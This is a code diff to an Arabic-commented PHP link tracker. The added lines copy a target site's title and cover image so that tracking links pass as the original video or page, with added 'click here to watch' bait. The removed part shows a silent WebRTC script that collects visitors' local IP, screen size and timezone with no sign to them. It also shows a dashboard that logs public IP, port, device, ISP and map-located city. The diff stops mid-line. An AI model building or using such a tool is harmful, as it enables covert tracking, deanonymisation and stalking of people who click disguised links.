@@ -38,33 +38,51 @@ try {
     die("خطأ في قاعدة البيانات: " . $e->getMessage());
 }
 
-// دالة سحب العنوان وصورة الغلاف الأصلية من الفيديو
-function fetch_meta_details($url) {$parsed = parse_url($url);$title = $parsed['host'] ?? $url;
-    $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
+// دالة متطورة لسحب العنوان وصورة الغلاف تلقائياً من الموقع الأصلي
+function fetch_real_meta($url) {$parsed_url = parse_url($url);$default_title = $parsed_url['host'] ?? $url;
+    $default_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 
+    // استخراج غلاف يوتيوب مباشرة إن وجد
     if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
         $video_id =$matches[1];
-        $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
+        $default_image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
     }
 
-    $options = [
-        'http' => [
-            'method' => "GET",
-            'header' => "User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)\r\n"
-        ]
-    ];
-    $context = stream_context_create($options);$html = @file_get_contents($url, false,$context);
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL,$url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
+    $html = curl_exec($ch);
+    curl_close($ch);
 
     if ($html) {
-        if (preg_match('/<property="og:title"\s+content="([^"]+)"/i', $html,$m) || preg_match('/<title>(.*?)<\/title>/i', $html,$m)) {
-            $title = html_entity_decode($m[1], ENT_QUOTES, 'UTF-8');
+        // استخراج العنوان الحقيقي من og:title أو title الوسم
+        if (preg_match('/<meta[^>]+property=["\']og:title["\'][^>]+content=["\']([^"\']+)["\']/i', $html,$m) || 
+            preg_match('/<meta[^>]+name=["\']twitter:title["\'][^>]+content=["\']([^"\']+)["\']/i', $html,$m) || 
+            preg_match('/<title>(.*?)<\/title>/is', $html,$m)) {
+            $extracted_title = trim(html_entity_decode(strip_tags($m[1]), ENT_QUOTES, 'UTF-8'));
+            if (!empty($extracted_title)) {
+                $default_title =$extracted_title;
+            }
         }
-        if (!isset($video_id) && preg_match('/<property="og:image"\s+content="([^"]+)"/i', $html,$m)) {
-            $image =$m[1];
+
+        // استخراج صورة الغلاف من og:image
+        if (!isset($video_id) && (preg_match('/<meta[^>]+property=["\']og:image["\'][^>]+content=["\']([^"\']+)["\']/i', $html,$m) || 
+            preg_match('/<meta[^>]+name=["\']twitter:image["\'][^>]+content=["\']([^"\']+)["\']/i', $html,$m))) {
+            $extracted_image = trim($m[1]);
+            if (!empty($extracted_image)) {
+                // معالجة الروابط النسبية إن وجدت
+                if (strpos($extracted_image, 'http') !== 0) {$scheme = $parsed_url['scheme'] ?? 'https';$host = $parsed_url['host'] ?? '';$extracted_image = $scheme . '://' .$host . (strpos($extracted_image, '/') === 0 ? '' : '/') .$extracted_image;
+                }
+                $default_image =$extracted_image;
+            }
         }
     }
 
-    return ['title' => $title, 'image' =>$image];
+    return ['title' => $default_title, 'image' =>$default_image];
 }
 
 function get_real_ip() {
@@ -117,8 +135,8 @@ function get_ip_details($ip) {
     return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
 }
 
-// 1. معالجة إعادة التوجيه الفوري
-$og_title = "";
+// 1. معالجة إعادة التوجيه
+$og_title = "رابط تفاعلي";
 $og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 
 if (isset($_GET['r'])) {
@@ -129,8 +147,12 @@ if (isset($_GET['r'])) {
 
     if ($link) {
         $target =$link['target_url'];
-        $og_title = !empty($link['meta_title']) ? $link['meta_title'] : parse_url($target, PHP_URL_HOST);
-        $og_image = !empty($link['meta_image']) ? $link['meta_image'] :$og_image;
+        if (!empty($link['meta_title'])) {
+            $og_title =$link['meta_title'];
+        }
+        if (!empty($link['meta_image'])) {
+            $og_image =$link['meta_image'];
+        }
 
         $public_ip = get_real_ip();
         $local_ip =$_GET['lip'] ?? 'غير متوفر';
@@ -156,7 +178,7 @@ if (isset($_GET['r'])) {
     }
 }
 
-// 2. إنشاء رابط جديد
+// 2. إنشاء رابط جديد وجلب العنوان الحقيقي تلقائياً من الموقع
 $generated_link = "";
 $tracking_code = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
@@ -165,7 +187,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
         $target_url = "https://" . $target_url;
     }
 
-    $meta = fetch_meta_details($target_url);
+    $meta = fetch_real_meta($target_url);
 
     $code = substr(md5(uniqid(rand(), true)), 0, 7);
     $stmt =$db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image) VALUES (?, ?, ?, ?)");
@@ -194,10 +216,11 @@ if (!empty($filter_code)) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title><?php echo htmlspecialchars($og_title); ?></title>
     
-    <!-- وسوم المعاينة الأصلية للفيديو -->
+    <!-- وسوم المعاينة المباشرة المستخرجة من الموقع الأصلي -->
     <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
+    <meta property="og:description" content="اضغط هنا للمشاهدة والتفاصيل.">
     <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
-    <meta property="og:type" content="video.other">
+    <meta property="og:type" content="website">
 
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
@@ -219,177 +242,4 @@ if (!empty($filter_code)) {
         button:hover, .btn:hover { background: #0369a1; }
         .result-box { background: #030712; border: 1px solid rgba(56, 189, 248, 0.3); padding: 14px; border-radius: 8px; margin-top: 12px; word-break: break-all; }
         .table-container { overflow-x: auto; margin-top: 12px; border: 1px solid #1f2937; border-radius: 8px; }
-        table { width: 100%; border-collapse: collapse; text-align: right; font-size: 12px; min-width: 1000px; }
-        th { background: #030712; color: #9ca3af; padding: 12px; border-bottom: 1px solid #1f2937; white-space: nowrap; }
-        td { padding: 12px; border-bottom: 1px solid #1f2937; color: #e5e7eb; white-space: nowrap; }
-        tr:hover { background: rgba(31, 41, 55, 0.4); }
-        .badge { background: #064e3b; color: #34d399; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; border: 1px solid #065f46; }
-        .ip-public { font-family: monospace; color: #38bdf8; font-weight: bold; }
-        .ip-local { font-family: monospace; color: #34d399; font-weight: bold; }
-        .port-badge { font-family: monospace; color: #f43f5e; background: rgba(244, 63, 94, 0.1); padding: 3px 6px; border-radius: 4px; font-weight: bold; border: 1px solid rgba(244, 63, 94, 0.2); }
-        .copy-btn { background: #374151; padding: 6px 10px; font-size: 11px; border-radius: 4px; cursor: pointer; color: #fff; border: none; }
-        .copy-btn.success { background: #059669; }
-        .map-btn { background: #047857; color: #fff; padding: 5px 10px; border-radius: 6px; font-size: 11px; text-decoration: none; font-weight: bold; display: inline-block; }
-        .map-btn:hover { background: #065f46; }
-        .link-row { display: flex; gap: 8px; margin-top: 6px; align-items: center; }
-    </style>
-    <script>
-        function getLocalIP(callback) {
-            let ips = [];
-            let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-            if (!RTCPeerConnection) { callback("غير مدعوم"); return; }
-            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-            pc.createDataChannel("");
-            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-            
-            pc.onicecandidate = function(ice) {
-                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
-                if (myIP) {
-                    let ip = myIP[1];
-                    if (!ips.includes(ip)) {
-                        ips.push(ip);
-                        if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
-                            callback(ip);
-                            pc.onicecandidate = null;
-                        }
-                    }
-                }
-            };
-            setTimeout(() => { if (ips.length === 0) callback("192.168.1.X"); }, 300);
-        }
-
-        document.addEventListener("DOMContentLoaded", function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const redirectCode = urlParams.get('r');
-            const hasScreen = urlParams.has('screen');
-
-            // تتبع صامت وفوري في الخلفية بدون أي نوافذ أو تأخير يلاحظه الزائر
-            if (redirectCode && !hasScreen) {
-                getLocalIP(function(localIp) {
-                    const screenRes = screen.width + "x" + screen.height;
-                    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    window.location.href = `/?r=${redirectCode}&lip=${encodeURIComponent(localIp)}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
-                });
-            }
-        });
-
-        function copyText(text, btnElement) {
-            navigator.clipboard.writeText(text).then(() => {
-                const original = btnElement.innerText;
-                btnElement.innerText = "تم ✓";
-                btnElement.classList.add("success");
-                setTimeout(() => {
-                    btnElement.innerText = original;
-                    btnElement.classList.remove("success");
-                }, 2000);
-            });
-        }
-    </script>
-</head>
-<body>
-    <div class="container">
-        
-        <div class="card header">
-            <div>
-                <h1>Hello World from azez</h1>
-                <p style="color: #9ca3af; font-size: 12px; margin-top: 2px;">لوحة تحكم تتبع الروابط المتقدمة</p>
-            </div>
-            <div class="stats-group">
-                <div class="stat-box">
-                    <span>الروابط</span>
-                    <strong><?php echo $total_links; ?></strong>
-                </div>
-                <div class="stat-box">
-                    <span>النقرات</span>
-                    <strong style="color: #34d399;"><?php echo $total_visits; ?></strong>
-                </div>
-            </div>
-        </div>
-
-        <div class="card">
-            <h2>🔗 إنشاء رابط تتبع جديد</h2>
-            <form method="POST" class="form-group">
-                <input type="text" name="target_url" placeholder="أدخل رابط الفيديو (يوتيوب، فيسبوك...)" required>
-                <button type="submit" name="create">توليد الرابط</button>
-            </form>
-
-            <?php if (!empty($generated_link)): ?>
-                <div class="result-box">
-                    <span style="font-size: 11px; color: #9ca3af;">رابط التتبع النشط:</span>
-                    <div class="link-row">
-                        <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
-                        <button type="button" class="copy-btn" style="padding: 10px 14px;" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">نسخ الرابط</button>
-                    </div>
-                    <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 10px; font-size: 11px;">
-                        <div style="display: flex; align-items: center; gap: 8px;">
-                            <span>كود التتبع: <strong style="color: #34d399; font-size: 13px;"><?php echo htmlspecialchars($tracking_code); ?></strong></span>
-                            <button type="button" class="copy-btn" onclick="copyText('<?php echo htmlspecialchars($tracking_code); ?>', this)">نسخ الكود</button>
-                        </div>
-                        <a href="/?track=<?php echo htmlspecialchars($tracking_code); ?>" style="color: #38bdf8; text-decoration: none;">إحصائيات هذا الرابط ←</a>
-                    </div>
-                </div>
-            <?php endif; ?>
-        </div>
-
-        <div class="card">
-            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; margin-bottom: 10px;">
-                <h2>📊 سجلات الزيارات الحية</h2>
-                <form method="GET" style="display: flex; gap: 5px; margin: 0; width: 100%; max-width: 300px;">
-                    <input type="text" name="track" placeholder="بحث بالكود..." value="<?php echo htmlspecialchars($filter_code); ?>" style="padding: 8px; font-size: 12px;">
-                    <button type="submit" style="padding: 8px 12px; font-size: 12px;">بحث</button>
-                    <?php if(!empty($filter_code)): ?>
-                        <a href="/" class="btn" style="background: #dc2626; padding: 8px 10px; font-size: 12px;">إلغاء</a>
-                    <?php endif; ?>
-                </form>
-            </div>
-
-            <div class="table-container">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>#</th>
-                            <th>الكود</th>
-                            <th>عنوان IP العام</th>
-                            <th>عنوان IP المحلي</th>
-                            <th>رقم المنفذ (Port)</th>
-                            <th>نوع الجهاز والموديل</th>
-                            <th>الموقع الخريطة</th>
-                            <th>مزود الخدمة</th>
-                            <th>الشاشة والتوقيت</th>
-                            <th>الوقت (التوقيت الجزائري)</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <?php if (empty($logs)): ?>
-                            <tr><td colspan="10" style="text-align: center; color: #6b7280; padding: 25px;">لا توجد أي زيارات مسجلة حتى الآن.</td></tr>
-                        <?php else: ?>
-                            <?php foreach ($logs as$log): ?>
-                            <tr>
-                                <td><?php echo $log['id']; ?></td>
-                                <td>
-                                    <span class="badge"><?php echo htmlspecialchars($log['code']); ?></span>
-                                    <button type="button" class="copy-btn" style="font-size: 9px; padding: 2px 5px; margin-right: 3px;" onclick="copyText('<?php echo htmlspecialchars($log['code']); ?>', this)">نسخ</button>
-                                </td>
-                                <td class="ip-public"><?php echo htmlspecialchars($log['public_ip'] ?? 'N/A'); ?></td>
-                                <td class="ip-local"><?php echo htmlspecialchars($log['local_ip'] ?? '192.168.1.X'); ?></td>
-                                <td><span class="port-badge"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></span></td>
-                                <td style="color: #fbbf24; font-weight: bold;"><?php echo htmlspecialchars($log['device_info']); ?></td>
-                                <td>
-                                    <strong><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></strong><br>
-                                    <a class="map-btn" href="https://www.google.com/maps?q=<?php echo htmlspecialchars($log['lat']); ?>,<?php echo htmlspecialchars($log['lon']); ?>" target="_blank">📍 خريطة جوجل</a>
-                                </td>
-                                <td><strong style="color: #38bdf8;"><?php echo htmlspecialchars($log['isp']); ?></strong></td>
-                                <td><?php echo htmlspecialchars($log['screen_res']); ?> - <?php echo htmlspecialchars($log['timezone']); ?></td>
-                                <td style="color: #34d399; font-weight: bold; white-space: nowrap;"><?php echo htmlspecialchars($log['created_at']); ?></td>
-                            </tr>
-                            <?php endforeach; ?>
-                        <?php endif; ?>
-                    </tbody>
-                </table>
-            </div>
-        </div>
-
-    </div>
-</body>
-</html>
+        table { width: 1
